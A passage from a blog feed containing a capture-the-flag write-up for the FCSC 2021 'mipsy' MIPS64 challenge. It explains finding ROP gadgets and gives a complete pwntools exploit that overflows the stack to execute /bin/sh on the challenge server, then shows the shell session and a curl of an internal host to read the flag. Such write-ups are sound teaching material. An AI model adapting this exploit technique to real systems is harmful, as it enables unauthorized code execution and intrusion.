</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">EC</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">dup2</span>        <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">F0</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; dup2
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">F4</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; dup2       ; Jump And Link Register
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">F8</span>                 <span class="no">nop</span>                      <span class="c">; nop
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">FC</span>                 <span class="no">lw</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">8</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>      <span class="c">; Load Word
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004100</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; fd
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004104</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">close</span>       <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004108</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; close
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000410</span><span class="no">C</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; close      ; Jump And Link Register
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004110</span>                 <span class="no">nop</span>                      <span class="c">; nop
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004114</span>                 <span class="no">lw</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0xC</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>    <span class="c">; Load Word
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004118</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; fd
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000411</span><span class="no">C</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">close</span>       <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004120</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; close
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004124</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; close      ; Jump And Link Register
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004128</span>                 <span class="no">nop</span>                      <span class="c">; nop
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000412</span><span class="no">C</span>                 <span class="no">ld</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x1010</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>  <span class="c">; Load Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004130</span>                 <span class="no">daddiu</span>  <span class="no">$v1</span><span class="p">,</span> <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x1010</span>  <span class="c">; Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004134</span>                 <span class="no">move</span>    <span class="no">$a2</span><span class="p">,</span> <span class="no">$zero</span>       <span class="c">; envp
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004138</span>                 <span class="no">move</span>    <span class="no">$a1</span><span class="p">,</span> <span class="no">$v1</span>         <span class="c">; argv
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000413</span><span class="no">C</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; path
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004140</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">execve</span>      <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004144</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; execve
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004148</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; execve     ; Jump And Link Register
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000414</span><span class="no">C</span>                 <span class="no">nop</span>
<span class="c">; skip
</span></code></pre></div><p>It&rsquo;s a part of the <code>ip</code> function, called when we trigger the &ldquo;Show network interfaces&rdquo; option. When I saw at the begin of the function, some local variables like a pointer to the <code>&quot;/bin/sh&quot;</code> string and a block of code which executes especially <code>execve(&quot;/bin/sh&quot;, &quot;-c&quot;, NULL)</code>. Since I discovered this basic block I thought I should have to jump around it with the right stackframe. But after a few hours I figured out it wasn&rsquo;t possible :(. And figured out too that the <code>NULL</code> byte isn&rsquo;t a badchar :).</p>
<div class="gblog-post__anchorwrap">
    <h4 id="ropchain">
        ROPchain
        <a data-clipboard-text="https://nasm.re/posts/mipsy/#ropchain" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor ROPchain" href="#ropchain">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h4>
</div>
<p>Now we&rsquo;re able to craft a ropchain with only one badchar: &ldquo;\n&rdquo;. To do so we can launch <a
  class="gblog-markdown__link"
  href="https://github.com/JonathanSalwan/ROPgadget"
  
  >ROPgadget</a
> to find some suitable gadgets:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ ROPgadget --binary mipsy &gt; gadgets
</code></pre></div><p>On mips architechture there is no <code>ret</code> or <code>pop</code> instructions, to handle this issue we use gadgets which load directly a 64 bit value stored in the stack into a register like this:</p>
<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">ld $a0, 0x8($sp) ; It will read the doubleword in $sp+8 to load it in the $a0 register.
</code></pre><p>And to return we need to find a load on a register like <code>$t9</code> which is often used to resolve and call extern functions or on <code>$ra</code> which is the standard register used to store the address of the calling function.</p>
<p>And that&rsquo;s why it&rsquo;s too hard to find automatically gadgets for mips binaries. But fortunately, ROPgadgets finds a a great amount of gadgets which helps us a lot.</p>
<p>The exploitation would be for me to jmp to the execve&rsquo;s call with the right context.
The code looks like such:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">0000000120004134</span>                 <span class="nf">move</span>    <span class="no">$a2</span><span class="p">,</span> <span class="no">$zero</span>       <span class="c">; envp
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004138</span>                 <span class="no">move</span>    <span class="no">$a1</span><span class="p">,</span> <span class="no">$v1</span>         <span class="c">; argv
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000413</span><span class="no">C</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; path
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004140</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">execve</span>      <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004144</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; execve
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004148</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; execve     ; Jump And Link Register
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000414</span><span class="no">C</span>                 <span class="no">nop</span>
</code></pre></div><p>To do so we have to:</p>
<ul>
<li>set <code>$v1</code> register to <code>NULL</code></li>
<li>set <code>$v0</code> register to a pointer to <code>/bin/sh</code></li>
<li>set <code>$gp</code>, the global pointer to the right value to be able do execute the <code>dla</code> instruction.</li>
</ul>
<p>An important thing to notice is that on mips architechture, when an instruction is executed the next instruction is too executed despite of the result of the current instruction. So when we will choose our gadgets, we need to be careful according to the instruction after the control flow instruction.</p>
<p>And the good value for <code>$gp</code> is a constant from which the <a
  class="gblog-markdown__link"
  href="https://sourceware.org/binutils/docs-2.24/as/MIPS-Small-Data.html"
  
  ><code>dla</code></a
> instruction addresses memory areas. And if we check the value of <code>$gp</code> in gdb, we got: <code>0x120048020</code>.</p>
<p>To control the <code>$v1</code> register we can grep on the gadgets found by ROPgadget:</p>
<pre tabindex="0"><code>$ grep &quot;ld \$v0, &quot; gadgets | grep \$sp
</code></pre><p>Then we got a lot of candidate which are not efficient. And if we&rsquo;re very careful we find an interesting gadget:</p>
<pre tabindex="0"><code>0x000000012001b4d8 : ld $v0, 0x210($sp) ; ld $t9, 0x228($sp) ; jalr $t9 ; move $a0, $s6
</code></pre><p>It&rsquo;s perfect because it allows us to control the value of <code>$v0</code> and the value of the next gadget that we can store in <code>$t9</code> to jump on !</p>
<p>We can apply process to find a gadget for $v1:</p>
<pre tabindex="0"><code>$ grep &quot;ld \$v1, &quot; gadgets | grep \$sp
[skip]
0x000000012001270c : ld $v1, 0x80($sp) ; sd $v0, 0xf0($sp) ; dsubu $s5, $v0, $v1 ; dsll $v0, $s5, 6 ; ld $a0, 0xb8($sp) ; ld $t9, 0xe0($sp) ; move $a1, $v0 ; sd $v1, 0xf8($sp) ; jalr $t9 ; sd $v0, 0x100($sp)
[skip]
</code></pre><p>It&rsquo;s a gadget a bit more hard to understand but we just have to take care to: do not write <code>$v0</code>, control the value of <code>$v9</code> to jump on, control the value of <code>$v1</code>. And so this gadget is a good candidate.</p>
<p>Finally we need to control the value of the <code>$gp</code> register but to achieve that we do not need to use a gadget, because we already control it thanks to the vuln epilogue:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">00000001200046</span><span class="nf">A4</span> <span class="no">loc_1200046A4</span><span class="p">:</span>                           <span class="c"># CODE XREF: authenticate+104↑j
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">A4</span>                 <span class="no">move</span>    <span class="no">$sp</span><span class="p">,</span> <span class="no">$fp</span>         <span class="c"># _
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">A8</span>                 <span class="no">ld</span>      <span class="no">$ra</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">ret_addr</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c"># Load Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">AC</span>                 <span class="no">ld</span>      <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">var_10</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c"># Load Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">B0</span>                 <span class="no">ld</span>      <span class="no">$gp</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">var_18</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c"># Load Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">B4</span>                 <span class="no">daddiu</span>  <span class="no">$sp</span><span class="p">,</span> <span class="mi">0x90</span>        <span class="c"># Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">B8</span>                 <span class="no">jr</span>      <span class="no">$ra</span>              <span class="c"># Jump Register
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">BC</span>                 <span class="no">nop</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="put-all-together">
        Put all together
        <a data-clipboard-text="https://nasm.re/posts/mipsy/#put-all-together" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Put all together" href="#put-all-together">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>For the pruposes of mips exploitation I developped a small function in python which inserts automatically a value at an arbitrary offset.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">make_pld</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">pos</span><span class="p">):</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">==</span> <span class="n">pos</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Gadget: s += </span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
        <span class="n">s</span> <span class="o">+=</span> <span class="n">val</span>
        <span class="k">return</span> <span class="n">s</span>
    <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">pos</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Gadget: </span><span class="si">{</span><span class="n">s</span><span class="p">[:</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2"> + </span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="s2"> + </span><span class="si">{</span><span class="n">s</span><span class="p">[</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">val</span><span class="p">):]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
        <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="p">[:</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">val</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">val</span><span class="p">):]</span>
        <span class="k">return</span> <span class="n">s</span> 
    <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">pos</span><span class="p">:</span>
        <span class="n">k</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="n">pos</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Gadget: </span><span class="si">{</span><span class="n">s</span><span class="si">}</span><span class="s2"> + </span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2"> + </span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">s</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="n">pos</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="o">+</span> <span class="n">val</span>
</code></pre></div><p>It&rsquo;s very useful because we are then able to give the right offset about the stack pointer when we execute the gadgets.
We can begin by overwriting the value of the saved <code>$gp</code> and <code>$ra</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">GP</span> <span class="o">=</span> <span class="mh">0x120048020</span>
<span class="n">BASE_RSP</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">GP</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)</span> <span class="c1"># $gp</span>
<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">SET_V1</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span> <span class="c1"># $ra</span>
</code></pre></div><p>BASE_RSP is the offset of the input&rsquo;s buffer about the <code>$sp</code> address when we return and so when we start to execute some gadgets.
We indicate the gadget to execute which is the gadget which sets <code>$v1</code> register to zero.</p>
<p>Then we can put the right value in <code>$v1</code> by looking at the SET_V1 gadget which loads the doubleword in <code>0x80($sp)</code> in <code>$v1</code>.
So we have to add to our payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x80</span><span class="p">))</span> <span class="c1"># $v1</span>
</code></pre></div><p>And we have to set the right value for the next gadget to execute. The gadget loads the doubleword in <code>0xe0($sp)</code> in <code>$t9</code> and then jmp on, so we can add our SET_V0 gadget to be then executed:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">SET_V0</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0xe0</span><span class="p">))</span> <span class="c1"># $t9</span>
</code></pre></div><p>We repeat the same operation for the SET_V0 gadget by setting a pointer to <code>'/bin/sh'</code> in <code>0x210($sp)</code> and the address of the final execve call in <code>0x228($sp)</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">BINSH</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x210</span><span class="p">))</span> <span class="c1"># $v0</span>
<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">EXECVE</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x228</span><span class="p">))</span> <span class="c1"># $t9</span>
</code></pre></div><p>We finished the ROPchain, now we just have to send it to the server and to enjoy the shell !</p>
<p>The final script looks like such:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/python3</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">ELF</span><span class="p">,</span> <span class="n">context</span><span class="p">,</span> <span class="n">remote</span><span class="p">,</span> <span class="n">p64</span> 

<span class="n">BINSH</span> <span class="o">=</span> <span class="mh">0x120025A20</span>

<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;mipsy&#39;</span><span class="p">)</span>

<span class="n">context</span><span class="o">.</span><span class="n">bits</span> <span class="o">=</span> <span class="mi">64</span> <span class="c1"># mips64</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;mips&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s2">&#34;big&#34;</span> <span class="c1"># Not a mipsel binary</span>

<span class="k">def</span> <span class="nf">make_pld</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">pos</span><span class="p">):</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">==</span> <span class="n">pos</span><span class="p">:</span>
        <span class="n">s</span> <span class="o">+=</span> <span class="n">val</span>
        <span class="k">return</span> <span class="n">s</span>
    <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">pos</span><span class="p">:</span>
        <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="p">[:</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">val</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">val</span><span class="p">):]</span>
        <span class="k">return</span> <span class="n">s</span> 
    <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">pos</span><span class="p">:</span>
        <span class="n">k</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="n">pos</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">s</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="n">pos</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="o">+</span> <span class="n">val</span> 

<span class="n">SET_V0</span> <span class="o">=</span> <span class="mh">0x12001B4D8</span> <span class="c1"># : ld $v0, 0x210($sp) ; ld $t9, 0x228($sp) ; jalr $t9 ; move $a0, $s6</span>

<span class="n">SET_V1</span> <span class="o">=</span> <span class="mh">0x000000012001270c</span> <span class="c1"># : ld $v1, 0x80($sp) ; sd $v0, 0xf0($sp) ; dsubu $s5, $v0, $v1 ; dsll $v0, $s5, 6 ; ld $a0, 0xb8($sp) ; ld $t9, 0xe0($sp) ; move $a1, $v0 ; sd $v1, 0xf8($sp) ; jalr $t9 ; sd $v0, 0x100($sp)</span>

<span class="n">EXECVE</span> <span class="o">=</span> <span class="mh">0x120004134</span>

<span class="n">GP</span> <span class="o">=</span> <span class="mh">0x120048020</span>
<span class="n">BASE_RSP</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;challenges2.france-cybersecurity-challenge.fr&#34;</span><span class="p">,</span> <span class="mi">4005</span><span class="p">)</span>
    <span class="c1"># return remote(&#34;localhost&#34;, 4000)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;] &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>

<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">GP</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)</span> <span class="c1"># $gp</span>
<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">SET_V1</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span> <span class="c1"># $ra</span>
<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x80</span><span class="p">))</span> <span class="c1"># $v1</span>
<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">SET_V0</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0xe0</span><span class="p">))</span> <span class="c1"># $t9</span>
<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">BINSH</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x210</span><span class="p">))</span> <span class="c1"># $v0</span>
<span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">EXECVE</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x228</span><span class="p">))</span> <span class="c1"># $t9</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">,</span> <span class="n">pld</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="final-part">
        Final part
        <a data-clipboard-text="https://nasm.re/posts/mipsy/#final-part" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Final part" href="#final-part">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>According to the statements we need to read some files stored on the filer machine.
So firstly let&rsquo;s run the exploit to get the shell:</p>
<pre tabindex="0"><code>$ ./solve.py                                                                  
[!] Could not emulate PLT instructions for ELF('mipsy/mipsy')
[!] Could not populate PLT: not enough values to unpack (expected 2, got 0)
[*] 'mipsy/mipsy'
    Arch:     mips64-64-big
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x120000000)
    RWX:      Has RWX segments
[+] Opening connection to challenges2.france-cybersecurity-challenge.fr on port 4005: Done
[*] Switching to interactive mode
Error: wrong password.
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls
list_interfaces.sh
mipsy
$
</code></pre><p>We see no flag, so according to the statements maybe we have to curl the filer machine which seems to be a HTTP server:</p>
<pre tabindex="0"><code>$ curl filer
&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
&lt;title&gt;Directory listing for /&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;Directory listing for /&lt;/h1&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;flag&quot;&gt;flag&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>It&rsquo;s a directory listing of the files stored in filer, and so we just have to <code>curl filer/flag</code> to get the flag:</p>
<pre tabindex="0"><code>$ curl filer/flag
FCSC{82ed60ce9c8b1136b1da7df24c9996b6232671e66f62bad1bd0e3fc163761519}
</code></pre><p>And we got the flag !
This challenge was very cool because it&rsquo;s a &ldquo;real world&rdquo; scenario and it makes me discovering mips assembly !</p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/ret2school" term="ret2school" label="ret2school" />
                             
                                <category scheme="https://nasm.re/tags/FCSC" term="FCSC" label="FCSC" />
                             
                                <category scheme="https://nasm.re/tags/mipsy" term="mipsy" label="mipsy" />
                             
                                <category scheme="https://nasm.re/tags/n4sm" term="n4sm" label="n4sm" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/2021" term="2021" label="2021" />
                             
                                <category scheme="https://nasm.re/tags/mips" term="mips" label="mips" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                            
                        
                    
                
            
        </entry>
    
</feed>
